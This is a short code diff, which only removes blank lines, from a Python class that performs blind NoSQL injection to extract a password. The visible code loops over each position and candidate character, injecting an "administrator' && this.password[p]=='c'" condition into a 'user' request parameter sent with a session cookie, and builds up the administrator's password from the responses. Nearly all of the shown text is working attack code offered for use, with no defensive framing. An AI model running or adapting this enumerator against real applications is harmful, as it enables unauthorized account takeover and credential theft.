@@ -9,13 +9,9 @@ class NoSQLPasswordEnumerator:
     PASSWORD_LENGTH=8
     COOKIE="session=SESSION-ID"
 
-   
-
-
     def enumerate_password(Alp: str, len_pass: int ,  base_url: str, end_pnt:str, coockie: str) -> str:
         password =""
    
-
         for p in range(len_pass):
             for char in Alp:
                 params ={"user":f"administrator' && this.password[{p}]=='{char}' || '1'=='2"}
@@ -34,11 +30,7 @@ class NoSQLPasswordEnumerator:
                 print(f"No matching character found at position {p+1}, stopping.")
                 break
 
-
         return password
-
-
-
 
     if __name__ == "__main__":
         print(f"Enumerated password: {enumerate_password(ALPHABETS, PASSWORD_LENGTH, BASE_URL, END_POINT, COOKIE)}")
